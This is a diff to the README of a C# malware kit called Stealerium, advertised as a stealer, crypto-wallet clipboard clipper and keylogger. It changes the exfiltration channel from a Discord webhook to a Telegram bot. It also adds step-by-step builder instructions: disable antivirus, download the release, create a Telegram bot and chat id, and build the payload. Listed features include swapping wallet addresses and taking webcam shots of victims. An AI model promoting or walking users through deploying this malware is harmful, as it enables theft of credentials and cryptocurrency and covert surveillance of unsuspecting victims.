@@ -1,7 +1,7 @@
 <p align="center">
   <img src="https://user-images.githubusercontent.com/73314940/227033966-765bde5a-438d-4b97-844b-f70c67ac6352.jpg"><br>
   <strong>Stealer + Clipper + Keylogger</strong><br>
-  <em>A Stealer written in C#, designed to send logs to your Discord channel via webhook.</em>
+  <em>A Stealer written in C#, designed to send logs to your Telegram bot.</em>
 </p>
 
 <p align="center">
@@ -55,23 +55,20 @@ These functions are available in the builder only if autorun is enabled:
 - **📋 Clipper:** Engages and alters crypto wallet addresses in the clipboard during transactions.
 - **📷 Webcam Screenshots:** Captured if the user views inappropriate content online.
 
-## 🔨 Builder GUI
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/6afe1780-5d7f-4ddd-833c-31bf4f5caad1">
-</p>
-
-## 🔨 Builder Console
-
-<p align="center">
-  <img src="https://user-images.githubusercontent.com/73314940/165985151-6f74dd66-c9d8-4063-a3e2-fe80d4a4f34a.png">
-</p>
+## 🔨 Builder
+- Temporarly disable your Antivirus
+- Download Stealerium.zip from https://github.com/Stealerium/Stealerium/releases and extract the zip content to a deseired folder.
+- Run BuilderGUI.exe
+- Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save token and bot name.
+- Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/GetMyChatID_Bot) and save the id.
+- Insert this data in BuilderGUI
+- Configure desired options
+- Hit Build and enjoy!
+<img width="600" alt="BuilderGUI" src="https://github.com/user-attachments/assets/db056797-cbae-4e04-a18a-32d27f2ade01">
 
 ## 📢 Channel Webhook
+<img width="600" src="https://user-images.githubusercontent.com/73314940/165986700-8109a5ab-a1e1-4e50-8e91-90e72eb41af1.png">
 
-<p align="center">
-  <img src="https://user-images.githubusercontent.com/73314940/165986700-8109a5ab-a1e1-4e50-8e91-90e72eb41af1.png">
-</p>
 
 ## Requirements
 
